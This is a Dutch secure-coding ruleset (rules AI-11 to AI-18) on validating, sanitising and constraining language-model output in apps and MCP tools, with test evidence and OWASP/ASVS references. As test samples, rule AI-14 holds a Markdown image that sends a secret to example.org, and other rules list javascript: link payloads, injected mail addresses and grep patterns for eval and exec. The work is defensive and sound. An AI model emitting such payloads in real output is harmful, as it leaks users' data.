# AI 2: Wat er met de uitvoer van een model gebeurt

Compacte regels van `dicht-ai-mcp`. Waarom, aanvalsvoorbeeld, fout en goed, bron en de toelichting van de tegenlezer staan per ID in `research/ai-mcp.md` (regelnummer in `regel-index.tsv`).

### AI-11 Valideer modeluitvoer tegen een strikt schema in code
hoog · hard · app | mcp | api | klantproject · tegenlezer: bevestigd (04-10-2026)
- Regel: Vraag gestructureerde uitvoer, valideer hem in vertrouwde code tegen een strikt schema (geen extra velden, grenzen per veld, opsommingen waar het kan) voordat een ander systeem ermee werkt, en behandel een afwijking als fout.
- Bewijs: Per modelaanroep bestaat een schema in de code, en een unit-test voert drie afwijkende antwoorden in (extra veld, onbekende enum-waarde, te lange string) die alle drie worden geweigerd. Afgevinkt met de testuitvoer. Zie API-01, API-02, API-03 en API-50.
- Norm: OWASP LLM Top 10 2026 LLM01 maatregel 2 en LLM10 Improper Output Handling maatregel 1; ASVS 5.0.0 V2.2.1 (L1).
- Zie ook: API-01, AI-23, API-50, WP-13, ARCH-07

### AI-12 Voer modeluitvoer nooit uit als code, query, commando of pad
kritiek · hard · alles · tegenlezer: bevestigd (04-10-2026) · bron niet gelezen: AGENTIC
- Regel: Zet tekst uit een model nooit rechtstreeks in `eval`, een shell, een SQL-string, een sjabloon, een bestandspad of een URL die de server ophaalt; gebruik voor elk van die doelen dezelfde veilige constructie als voor gebruikersinvoer.
- Bewijs: `grep -rnE "eval\(|new Function\(|exec\(|execSync\(|sql\.raw\(|sql\.unsafe\(" src/` geeft geen regel waarin een waarde uit een modelantwoord terechtkomt; elke database-aanroep met modeluitvoer gebruikt parameters. Afgevinkt met de grep-uitvoer en een verklaring per treffer. De uitwerking staat in DB-25, DB-26, DB-27 en WP-16 (SQL), API-53 (processen), API-54 (paden), API-56 (code), WEB-08 (sjablonen) en WEB-40 (URL's ophalen).
- Norm: OWASP LLM Top 10 2026 LLM10 maatregelen 1 en 5; OWASP Agentic 2026 ASI05 Unexpected Code Execution; ASVS 5.0.0 V1.3.2 (L1), V1.2.5 (L1), V1.3.6 (L2), V5.3.2 (L1).
- Zie ook: API-56, WEB-08

### AI-13 Render modeluitvoer als onvertrouwde inhoud
hoog · hard · app | website | wp-plugin | klantproject · tegenlezer: bevestigd (04-10-2026)
- Regel: Toon tekst uit een model als platte tekst, of haal Markdown en HTML uit een model door dezelfde sanitizer en contextcodering als inhoud van een gebruiker; zet modeluitvoer nooit met `innerHTML` of `dangerouslySetInnerHTML` in de pagina zonder sanitizer.
- Bewijs: De test uit WEB-03 (drie payloads) draait ook op elk veld dat modeluitvoer toont, met de payload als gesimuleerd modelantwoord; de uitvoer bevat geen handler, script of `javascript:`. De CSP uit WEB-11 staat aan op die pagina's. Afgevinkt met de testuitvoer en de header. Zie WEB-01, WEB-03, WEB-07 en WEB-37.
- Norm: OWASP LLM Top 10 2026 LLM10 maatregelen 3, 4 en 6; ASVS 5.0.0 V1.2.1 (L1), V1.3.1 (L1), V3.4.3 (L2).
- Zie ook: WEB-03, WP-04, WEB-07, INV-22, INV-23, INV-24, INV-26, MSG-23

### AI-14 Laat gerenderde modeluitvoer geen verzoeken naar buiten doen
kritiek · hard · app | klantproject · tegenlezer: bevestigd (04-10-2026)
- Regel: Render in modeluitvoer geen afbeeldingen, linkvoorbeelden, iframes of andere elementen die de browser of de client automatisch laat ophalen, tenzij het doel op een vaste allowlist van eigen origins staat; dwing dat af met de sanitizer en met `img-src` en `connect-src` in de CSP.
- Bewijs: (1) Een e2e-test die een modelantwoord met `![x](https://example.org/p?d=GEHEIM)` laat renderen en met Playwright vastlegt dat er geen aanvraag naar `example.org` vertrekt. (2) De CSP-header van die pagina bevat geen algemene `https:` in `img-src`. Afgevinkt met het netwerklog en de header. Aandachtspunt voor de audit: volgens eigen notities is `img-src` in de CRM-app op 06-07-2026 verruimd met `https:` om afbeeldingen in mail te tonen; of modeluitvoer daar als Markdown met afbeeldingen wordt gerenderd, is niet gemeten.
- Norm: OWASP LLM Top 10 2026 LLM10 maatregel 9 en LLM01 scenario 2; ASVS 5.0.0 V3.4.3 (L2) en V14.2.3 (L2).
- Zie ook: WEB-11, PRIV-85, WEB-58

### AI-15 Controleer elke link uit een model en open er nooit automatisch een
middel · hard · app | mcp | klantproject · tegenlezer: bevestigd (04-10-2026)
- Regel: Laat in modeluitvoer alleen links met het schema `https:` toe (eventueel `mailto:`), toon het echte doel zichtbaar, en laat geen code een URL uit een model automatisch openen, ophalen of volgen.
- Bewijs: De unit-test uit WEB-04 (met `javascript:`, `data:` en `JaVaScRiPt:`) draait op de functie die links uit modeluitvoer toelaat; `grep -rn "open(\|window.open(\|shell.openExternal(" src/` laat geen aanroep zien met een waarde uit een model of een tool zonder die controle. Afgevinkt met de testuitvoer en de grep.
- Norm: ASVS 5.0.0 V1.2.2 (L1); MCP Security Best Practices, sectie OAuth Authorization URL Validation; OWASP LLM Top 10 2026 LLM10.

### AI-16 Haal stuurtekens uit modeluitvoer voor terminal en logs
middel · richtlijn · app | mcp · tegenlezer: bevestigd (04-10-2026)
- Regel: Verwijder of codeer ANSI-escape-reeksen, BEL, OSC, backspace en carriage return uit modeluitvoer en tool-uitvoer voordat je die naar een terminal, een logbestand of een andere interpreterende bestemming schrijft.
- Bewijs: Een unit-test die een tekst met `\x1b[31m`, `\r` en `\x07` door de uitvoerfunctie haalt en controleert dat de bytes weg of zichtbaar gecodeerd zijn. Afgevinkt met de testuitvoer. Alleen van toepassing op CLI-gereedschap en op logs die in een terminal worden gelezen.
- Norm: OWASP LLM Top 10 2026 LLM10 maatregel 8.

### AI-17 Ontvanger, afzender en bijlagen van een bericht komen uit code, niet uit het model
hoog · hard · app | mcp | klantproject · tegenlezer: bevestigd (04-10-2026) · bron niet gelezen: AGENTIC
- Regel: Bepaal bij elk bericht dat een AI-functie opstelt of verstuurt (mail, WhatsApp, Slack, social) de ontvanger, de afzender, CC en BCC, de bijlagen en de afmeld- en betaallinks in code uit de database of de configuratie; het model levert alleen tekst binnen vaste vangrails, en een vaste controle keurt die tekst voor verzending.
- Bewijs: (1) In de verzendcode komt het `to`-adres uit een databaserecord en is er geen pad van modeluitvoer naar `to`, `cc`, `bcc`, `from` of `attachments` (aan te wijzen in de code). (2) Een test waarin het gesimuleerde modelantwoord een extra adres en een vreemde link bevat: het verzonden bericht gaat alleen naar het record-adres en de vaste controle weigert de link. (3) Links in de tekst worden vergeleken met een allowlist van eigen domeinen. Afgevinkt met de testuitvoer. Zie WEB-68 en WEB-69.
- Norm: OWASP LLM Top 10 2026 LLM03 maatregelen 2 en 7; OWASP Agentic 2026 ASI02 Tool Misuse; ASVS 5.0.0 V2.2.1 (L1).

### AI-18 Feiten waar iemand op vertrouwt komen uit een bron, niet uit het model
hoog · hard · app | mcp | klantproject · tegenlezer: bevestigd (04-10-2026)
- Regel: Laat prijzen, bedragen, termijnen, voorwaarden, voorraad en toezeggingen in tekst voor een klant nooit door het model bedenken; haal ze op het moment van gebruik op uit het bronsysteem, zet ze als gegeven in de prompt of vul ze in code in, en controleer in code dat elk bedrag in de uitvoer in de brondata voorkomt.
- Bewijs: (1) De prompt krijgt de prijs- en dienstgegevens als opgehaald blok met tijdstip. (2) Een controle in code haalt elk bedrag uit de uitvoer (reguliere expressie op valutabedragen) en weigert het concept als een bedrag niet in het opgehaalde blok staat. (3) Een test met een gesimuleerd antwoord dat een verzonnen bedrag bevat, wordt geweigerd. Afgevinkt met de testuitvoer.
- Norm: OWASP LLM Top 10 2026 LLM07 Misinformation, maatregelen 1 (Ground Claims Before Action), 2 (Claim-Check-Act) en 6 (verplichte velden).
